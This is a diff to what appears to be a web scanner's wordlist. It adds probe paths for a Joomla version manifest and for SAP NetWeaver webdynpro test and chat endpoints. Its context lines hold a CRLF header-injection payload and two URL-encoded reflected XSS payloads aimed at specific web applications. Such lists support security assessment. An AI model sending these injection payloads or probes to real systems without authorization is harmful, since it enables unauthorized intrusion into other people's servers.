@@ -51,3 +51,9 @@
 /~user/%0D%0ASet-Cookie:crlfinjection
 /ecrire/?exec=valider_xml&var_url=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /visualrf/group_list.xml?aps=1&start=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&end=500&match
+/
+/administrator/manifests/files/joomla.xml
+/webdynpro/resources/sap.com/tc~eu~jwf~wdgp/JWFTestAddAssignees
+/webdynpro/dispatcher/sap.com/tc~eu~jwf~wdgp/com.sap.workflow.wdgp.general.test.JWFTestAddAssignees
+/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat
+/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Messages
